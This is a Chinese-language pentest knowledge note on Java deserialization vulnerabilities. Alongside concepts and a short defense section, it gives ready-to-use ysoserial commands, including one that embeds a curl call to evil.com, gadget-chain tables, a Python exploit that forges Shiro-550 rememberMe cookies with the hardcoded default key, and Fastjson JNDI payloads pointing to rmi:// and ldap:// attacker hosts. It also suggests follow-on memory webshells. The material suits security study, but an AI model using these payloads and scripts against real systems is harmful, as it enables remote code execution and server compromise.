# Java 反序列化漏洞利用

## 一句话理解
Java 反序列化漏洞的核心，是应用把不可信字节流交给反序列化接口处理，攻击者再借助类库中的 Gadget 链，在对象恢复过程中触发方法调用、反射或命令执行。

## 基础理解
Java 序列化是把对象转换成字节序列，常见接口是 `ObjectOutputStream.writeObject()`。  
Java 反序列化是把字节序列恢复成对象，常见接口是 `ObjectInputStream.readObject()`。

对象要能被序列化，通常需要：
1. 实现 `java.io.Serializable`
2. 相关属性本身也可序列化，或被声明为瞬态字段

## 成立条件
典型需要同时满足：
1. 存在可控的反序列化入口
2. 运行环境中存在可利用的 Gadget 链

## 常见危害
- 远程代码执行
- 任意方法调用
- SSRF / JNDI 利用
- 文件写入
- 与框架组件联动形成更深利用链

## 常见入口点
### 1. 原生 Java 反序列化

```text
ObjectInputStream.readObject
ObjectInputStream.readUnshared
```

### 2. XML / YAML / JSON 等“非原生序列化”入口
这些问题不一定都属于原生 Java 序列化，但在实战里经常一起排查：

```text
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject
```

## 常见成因
- 接收来自网络、消息队列、缓存、文件的对象流并直接反序列化
- 依赖包中存在高危 Gadget
- 应用把 JNDI、RMI、XML、JSON 等入口错误地串进反序列化利用链

## 基础概念补充
### 1. JNDI
JNDI（Java Naming and Directory Interface）用于访问命名和目录服务，支持：
- DNS
- LDAP
- RMI
- CORBA

### 2. RMI
RMI（Remote Method Invocation）是 Java 远程方法调用机制，常见实现包括：
- JRMP
- CORBA 相关对象服务

这些机制经常与反序列化、JNDI 注入、远程类加载链条互相关联。

## 如何发现
### 1. 代码审计
优先搜索：
- `readObject`
- `readUnshared`
- `XMLDecoder`
- `XStream`
- `Yaml.load`
- `ObjectMapper.readValue`
- `JSON.parseObject`

### 2. 组件识别
重点识别是否存在高风险依赖：
- Commons Collections
- Spring
- Shiro
- XStream
- Fastjson
- 各类中间件和 RPC 框架

### 3. 输入源确认
关注：
- HTTP Body
- Cookie
- Session
- MQ 消息
- 缓存
- 文件上传内容

## 常见利用方向
### 1. Gadget 链利用
Java 反序列化的核心不是“构造一个危险对象就行”，而是利用类库中现成的调用链，把反序列化过程一路带到危险方法。

### 2. 框架与组件结合
以下场景常见于真实漏洞：

#### Spring
- Spring Framework 4.2.4 相关利用链
- POC: [spring-jndi](https://github.com/zerothoughts/spring-jndi)
- 分析：http://llfam.cn/2019/11/11/spring_4.2.4_unser/

#### Apache Commons Collections
- 这是 Java 反序列化史上最经典的 Gadget 来源之一
- 分析：https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/

#### Fastjson
- 严格来说更常归类为反序列化 / AutoType / 反射链利用，但实战中经常与 Java 反序列化一起梳理
- 分析：https://paper.seebug.org/1318/

#### Shiro
- 常与 RememberMe、反序列化链、密钥问题联动
- 分析：https://paper.seebug.org/1503/

#### Apache Solr
- [Apache Solr 反序列化远程代码执行漏洞分析（CVE-2019-0192）](https://www.anquanke.com/post/id/210866?luicode=10000011&lfid=1076033957583411&featurecode=newtitle%0AUltrasonic+Fingerprint+ID+on+the+Galaxy+S10%3A+Pesto+Fingers&u=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F210866)

#### WebLogic
- [WebLogic CVE-2021-2394 反序列化漏洞分析](https://www.anquanke.com/post/id/249654)

## ysoserial 使用

ysoserial 是 Java 反序列化利用的标准工具，内置主流 Gadget 链，一条命令即可生成序列化 payload。

### 1. 基础命令

```bash
# 生成 CommonsCollections6 链 payload，命令为 whoami，结果写入 poc.ser
java -jar ysoserial.jar CommonsCollections6 "whoami" > poc.ser

# URLDNS 链：只依赖 JDK 自带类，仅触发 DNS 请求，用于盲测反序列化入口是否存在
java -jar ysoserial.jar URLDNS "http://xxxx.dnslog.cn" > poc.ser

# 命令带参数时注意不同操作系统的写法差异
java -jar ysoserial.jar CommonsCollections6 "curl http://evil.com/?a=1"
```

### 2. 各链适用条件速查表

| Gadget 链 | 依赖要求 | JDK 限制 | 特点 |
|---|---|---|---|
| CommonsCollections1 | commons-collections 3.x | JDK < 8u71 | 入口 AnnotationInvocationHandler，8u71 起其 readObject 改写后失效 |
| CommonsCollections2 | commons-collections 4.x | 不限 | 入口 PriorityQueue，终点 TemplatesImpl 加载字节码 |
| CommonsCollections3 | commons-collections 3.x | JDK < 8u71 | 同 CC1 前段，终点 TemplatesImpl 加载字节码，命令执行受限时改用字节码加载 |
| CommonsCollections5 | commons-collections 3.x | JDK 1.7 / 1.8 | 入口 BadAttributeValueExpException，目标开启 SecurityManager 时失效 |
| CommonsCollections6 | commons-collections 3.x | 不限 | 入口 HashSet，最通用，首选链 |
| CommonsCollections7 | commons-collections 3.x | 不限 | 入口 Hashtable，需构造两个 key 哈希碰撞 |
| CommonsBeanutils1 | commons-beanutils（Shiro 自带） | 不限 | 目标无独立 CC 依赖时的替代链，打 Shiro-550 常用 |

### 3. 检测目标是否有依赖
- 看报错：发送 payload 后观察 `ClassNotFoundException` / `NoClassDefFoundError`，报错类名直接暴露目标缺失哪个依赖
- 看 WEB-INF/lib：存在任意文件读取 / 目录穿越 / 源码泄露时，直接列 `WEB-INF/lib/` 目录，看 jar 包名与版本（如 `commons-collections-3.1.jar`）
- JarAnalyzer：拿到整个 lib 目录后批量分析 jar 的版本与依赖关系
- 盲测：先用 URLDNS 链确认入口存在，再逐条换链测试 DNS 回连

### 4. 利用方式
- 写入文件（序列化串直接传）：把 `poc.ser` 直接作为请求体发送（`Content-Type: application/octet-stream`），或写入目标会反序列化读取的位置（缓存、MQ 消息、上传文件）
- Burp 改包：
  - 请求体：POST Body 直接替换为序列化二进制（注意二进制中的不可见字符不要被编辑器破坏）
  - rememberMe 场景：Shiro 的 Cookie，需先 AES 加密再放 Cookie（见下文 Shiro-550）
  - Base64 场景：入口参数为 Base64 时，先对 poc.ser 做 Base64 编码再替换
  - GET 参数场景：payload 走 URL 参数时需先 URL 编码

## CC 链原理速览

### 1. 核心思路

```text
反序列化入口 → 重写的 readObject 被触发 → 间接驱动 Transformer 链 → Runtime.exec / TemplatesImpl 加载字节码
```

关键角色：
- `InvokerTransformer`：反射调用任意方法，是命令执行的引擎
- `ChainedTransformer`：串联多个 Transformer，上一个的输出作为下一个的输入
- `LazyMap` / `TransformedMap`：把 Map 的取值 / 写值操作导向 Transformer 链
- 触发时机：`hashCode`、`toString`、`equals`、`readObject` 等在反序列化过程中被自动调用的方法

### 2. 一行式调用链

CC6 一句话版：

```text
HashSet.readObject → HashMap.hash → TiedMapEntry.hashCode → LazyMap.get → ChainedTransformer
```

| 链 | 入口 → … → 终点 |
|---|---|
| CC1 | AnnotationInvocationHandler.readObject → Map 动态代理 invoke → LazyMap.get → ChainedTransformer → Runtime.exec |
| CC3 | 同 CC1 前段 → InstantiateTransformer → TrAXFilter 构造器 → TemplatesImpl.newTransformer → 加载恶意字节码 |
| CC5 | BadAttributeValueExpException.readObject → TiedMapEntry.toString → LazyMap.get → ChainedTransformer → Runtime.exec |
| CC6 | HashSet.readObject → HashMap.hash → TiedMapEntry.hashCode → LazyMap.get → ChainedTransformer → Runtime.exec |
| CC7 | Hashtable.readObject → reconstitutionPut → TiedMapEntry.hashCode → LazyMap.get → ChainedTransformer → Runtime.exec |

为什么 CC6 最常用：不依赖 `AnnotationInvocationHandler`，不受 JDK 8u71 限制，入口是集合类，几乎所有场景通用。

## 组件实战利用

### 1. Shiro-550 完整流程

原理：Shiro 的 rememberMe Cookie 结构为 `Base64(AES-CBC(序列化数据))`。Shiro ≤ 1.2.4 使用硬编码默认 Key `kPH+bIxk5D2deZiIxcaaaA==`，拿到 Key 即可伪造任意反序列化 payload。

流程：
1. 检测：登录响应出现 `Set-Cookie: rememberMe=deleteMe` 说明是 Shiro；AES-CBC 密文长度恒为 16 字节整数倍是 rememberMe 的长度特征，可结合工具爆破 Key——用候选 Key 加密任意序列化数据发送，若响应不再出现 `deleteMe`，说明 Key 正确
2. 生成 payload：`java -jar ysoserial.jar CommonsBeanutils1 "whoami" > poc.ser`
3. 用默认 Key 做 AES-CBC 加密，随机 IV 前置在密文前
4. Base64 编码后放入 `rememberMe` Cookie 发送

Python 加密 exp：

```python
import base64
import uuid
from Crypto.Cipher import AES

# Shiro 550 默认硬编码 Key（Base64 解码后为 16 字节）
KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

# 读取 ysoserial 生成的序列化 payload
with open("poc.ser", "rb") as f:
    payload = f.read()

# AES-CBC 模式：随机生成 16 字节 IV，Shiro 解密时取密文前 16 字节作为 IV
iv = uuid.uuid4().bytes

# PKCS5 填充：把明文补齐到 16 字节整数倍
BS = AES.block_size
pad = lambda s: s + bytes([BS - len(s) % BS]) * (BS - len(s) % BS)

cipher = AES.new(KEY, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(payload))

# 最终 rememberMe 值 = Base64(IV + 密文)
print(base64.b64encode(iv + ciphertext).decode())
```

提示：Key 错误时 Shiro 解密失败会返回 `rememberMe=deleteMe`，可据此快速验证 Key 是否正确。

### 2. Fastjson 利用要点

探测版本：发送不闭合的 `@type`，报错信息常直接回显 fastjson 版本号：

```json
{"@type":"java.lang.AutoCloseable"
```

1.2.24（无 autoType 检查，经典 JNDI 外连）：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil:1099/Exploit","autoCommit":true}
```

1.2.47（autoType 绕过，二段式）：

```json
{
  "a": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
  "b": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil:1389/Exploit","autoCommit":true}
}
```

原理：第一段用不在黑名单的 `java.lang.Class` 把 JdbcRowSetImpl 装入 fastjson 类缓存，第二段直接实例化缓存中的类，绕过 autoType 检查。

1.2.68（safeMode 判断）：1.2.68 引入 `safeMode`，开启后 autoType 彻底禁用。判断方式：发送带 `@type` 的 payload，报错中出现 `safeMode not support autoType` 即代表 safeMode 已开启，autoType 方向的利用全部失效，需转向不出网本地 Gadget 或组件自身漏洞。

### 3. 反序列化 → 内存马

反序列化拿到 RCE 后，在 Tomcat / Spring 等中间件中通常进一步注入内存马（Filter / Listener / Controller 型）实现持久化与流量隐藏，交叉引用：[../penetration/Webshell-Bypass.md](../penetration/Webshell-Bypass.md)。

## 实战排查思路
### 1. 先找入口，不先找 payload
入口点永远比 payload 更重要。

### 2. 再看依赖
确认类路径里到底有哪些可用 Gadget。

### 3. 再判断 JDK 和组件版本
同样的链，在不同 JDK 和组件版本下可用性会差很多。

### 4. 再决定利用路径
常见路径：
- 原生反序列化链
- JNDI / RMI / LDAP 结合
- 中间件自带 Gadget
- 通过第三方依赖链下沉到命令执行

## 防御要点
### 1. 不反序列化不可信数据
这是根本原则。

### 2. 优先使用安全数据格式
如 JSON，并避免将其恢复成可执行对象图。

### 3. 升级依赖与 JDK
很多反序列化风险都和老版本依赖和老 JDK 的默认行为有关。

### 4. 加入反序列化过滤
使用白名单、类型过滤、深度限制等机制限制可反序列化类型。

### 5. 最小化依赖面
类路径里不需要的高危依赖越少，可用 Gadget 越少。

## 速查清单
- 先搜反序列化入口，再识别依赖和版本
- 关注 `readObject`、`XStream`、`XMLDecoder`、`Yaml.load`
- 区分原生 Java 反序列化与 JSON/XML 类对象恢复问题
- 把 Spring、Commons Collections、Shiro、WebLogic、Solr 作为高频关注对象
- 结合 JNDI、RMI、LDAP、JDK 版本判断真实可利用性

## Reference
- [深入理解 JAVA 反序列化漏洞](https://paper.seebug.org/312/#2)
- [ysoserial - GitHub](https://github.com/frohoff/ysoserial)
- [Y4er's Blog - Java 安全研究合集](https://y4er.com/)
- [Y4er - GitHub](https://github.com/Y4er)
- [JoyChou93/java-sec-code - Java 安全研究与漏洞靶场](https://github.com/JoyChou93/java-sec-code)
- [Seebug Paper - Java 安全研究](https://paper.seebug.org/)
- https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E
- http://llfam.cn/2019/11/11/spring_4.2.4_unser/
- https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/
- https://paper.seebug.org/1318/
- [Apache Solr反序列化远程代码执行漏洞分析（CVE-2019-0192）](https://www.anquanke.com/post/id/210866?luicode=10000011&lfid=1076033957583411&featurecode=newtitle%0AUltrasonic+Fingerprint+ID+on+the+Galaxy+S10%3A+Pesto+Fingers&u=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F210866)
- [WebLogic CVE-2021-2394 反序列化漏洞分析](https://www.anquanke.com/post/id/249654)
